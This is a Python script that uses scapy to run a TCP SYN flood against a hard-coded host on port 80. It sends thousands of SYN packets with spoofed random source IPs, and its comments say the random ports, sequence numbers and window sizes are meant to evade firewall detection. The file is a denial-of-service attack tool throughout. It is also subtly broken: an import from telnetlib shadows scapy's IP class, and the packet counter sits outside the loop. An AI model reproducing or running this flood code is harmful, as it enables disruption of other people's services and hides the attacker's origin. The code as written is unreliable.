from scapy.all import *
from telnetlib import IP
from scapy.layers.inet import TCP
import random
import sys
import os

def randomIP(): # 임의의 출발지 IP 생성 함수
    ip = ".".join(map(str, (random.randint(0,255) for _ in range(4))))
    return ip

def randInt(): # 방화벽 탐지 설정 교란을 위한 무작위 숫자 추출 함수
    Firewall_disturb = random.randint(1000, 9000)
    return Firewall_disturb

def TCP_Flood(dstIP, dstPort, counter): # 조작된 패킷 생성함수
    total = 0
    print("Packets are sending..")


    for Firewall_disturb in range(0, counter):
        s_port = randInt() # 포트 번호 무작위 설정
        s_eq = randInt() # 일련 번호 무작위설정
        w_indow = randInt() # 윈도우 크기 무작위 설정
        IP_Packet = IP()
        IP_Packet.src= randomIP()
        IP_Packet.dst= dstIP
        TCP_Packet = TCP()
        TCP_Packet.sport = s_port
        TCP_Packet.dport = dstPort
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq
        TCP_Packet.window = w_indow

        send(IP_Packet / TCP_Packet, verbose=0)
    total = total + 1
    sys.stdout.write("\nTotal packets sent: %i\n" % total)

def main():
    dstIP = "192.168.219.102"
    dstPort = 80
    counter = 10000
    TCP_Flood(dstIP, int(dstPort), int(counter))
main()





